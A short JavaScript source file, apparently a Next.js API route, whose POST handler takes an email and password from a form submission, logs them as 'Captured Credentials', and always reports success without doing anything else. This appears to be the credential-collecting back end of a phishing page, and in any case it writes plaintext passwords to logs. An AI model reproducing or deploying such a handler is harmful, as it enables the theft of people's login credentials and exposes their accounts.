// File: app/api/submit/route.js

export async function POST(request) {
  const body = await request.json();
  const { email, password } = body;

  console.log('📥 Captured Credentials:', { email, password });

  return new Response(JSON.stringify({ success: true }), {
    status: 200,
    headers: { 'Content-Type': 'application/json' },
  });
}
